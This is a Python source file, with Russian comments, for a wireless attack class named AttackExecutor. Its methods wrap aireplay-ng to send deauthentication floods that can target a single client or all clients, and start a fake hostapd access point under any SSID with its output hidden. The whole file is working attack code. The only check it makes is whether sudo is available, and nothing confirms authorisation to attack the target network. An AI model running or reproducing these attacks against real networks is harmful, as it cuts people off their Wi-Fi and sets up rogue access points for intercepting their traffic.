"""
Класс AttackExecutor - выполнение атак на беспроводные сети
Сгенерировано из диаграммы классов (diagrams/classes.puml)
"""

import subprocess
from typing import Optional


class AttackExecutor:
    """Выполнение атак типа deauth и fake AP"""
    
    def __init__(self, interface: str):
        """
        Инициализация исполнителя атак
        
        Args:
            interface: Сетевой интерфейс в режиме мониторинга
        """
        self.interface = interface
        self.target_mac: Optional[str] = None
        self.attack_type: str = ""
        self._check_permissions()
    
    def _check_permissions(self) -> bool:
        """
        Проверка прав для выполнения атак
        
        Returns:
            bool: Наличие необходимых прав
        """
        try:
            result = subprocess.run(['sudo', '-v'], capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def deauth_attack(self, target_mac: str, bssid: str, count: int = 100) -> bool:
        """
        Выполнение атаки deauth на указанную цель
        
        Args:
            target_mac: MAC-адрес клиента (FF:FF:FF:FF:FF:FF для всех)
            bssid: MAC-адрес точки доступа
            count: Количество пакетов для отправки
            
        Returns:
            bool: Успешность выполнения атаки
        """
        self.target_mac = target_mac
        self.attack_type = "deauth"
        
        try:
            cmd = [
                'sudo', 'aireplay-ng', '--deauth', str(count),
                '-a', bssid,
                '-c', target_mac,
                self.interface
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=30)
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def fake_ap(self, ssid: str, channel: int) -> None:
        """
        Создание фейковой точки доступа
        
        Args:
            ssid: Имя фейковой сети
            channel: Канал для вещания
        """
        self.attack_type = "fake_ap"
        
        try:
            # Запуск hostapd для создания фейковой AP
            hostapd_config = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
"""
            with open('/tmp/hostapd.conf', 'w') as f:
                f.write(hostapd_config)
            
            subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            
        except Exception:
            pass
    
    def stop_attack(self) -> None:
        """Остановка текущей атаки"""
        try:
            subprocess.run(['sudo', 'pkill', 'hostapd'], capture_output=True)
            subprocess.run(['sudo', 'pkill', 'aireplay-ng'], capture_output=True)
            self.attack_type = ""
        except:
            pass
